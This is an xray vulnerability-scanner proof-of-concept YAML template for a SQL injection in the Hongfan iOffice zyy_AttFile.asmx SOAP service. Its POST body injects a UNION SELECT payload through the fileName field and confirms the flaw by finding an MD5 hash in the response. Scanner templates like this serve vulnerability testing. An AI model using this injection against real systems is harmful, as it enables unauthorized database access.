backend/utils/tools/xray_darwin_arm64/poc/product-support.chaitin.cn/poc-yaml-hongfan-zyyattfile-sqli.yml

name: poc-yaml-hongfan-zyyattfile-sqli
manual: true
transport: http
set:
    s1: randomLowercase(8)
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /ioffice/prg/interface/zyy_AttFile.asmx
            headers:
                Content-Type: text/xml; charset=utf-8
                Soapaction: '"http://tempuri.org/GetFileAtt"'
            body: |-
                <?xml version="1.0" encoding="utf-8"?> <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
                  <soap:Body>
                    <GetFileAtt xmlns="http://tempuri.org/">
                      <fileName>-1' union select null,'null',sys.fn_sqlvarbasetostr(HashBytes('MD5','{{s1}}')),null,null,null--</fileName>
                    </GetFileAtt>
                  </soap:Body>
                </soap:Envelope>
            follow_redirects: false
        expression: response.status == 200 && response.body_string.contains(md5(s1))
expression: r0()
detail:
    author: 2husky
    links:
        - https://www.zsxq.com/
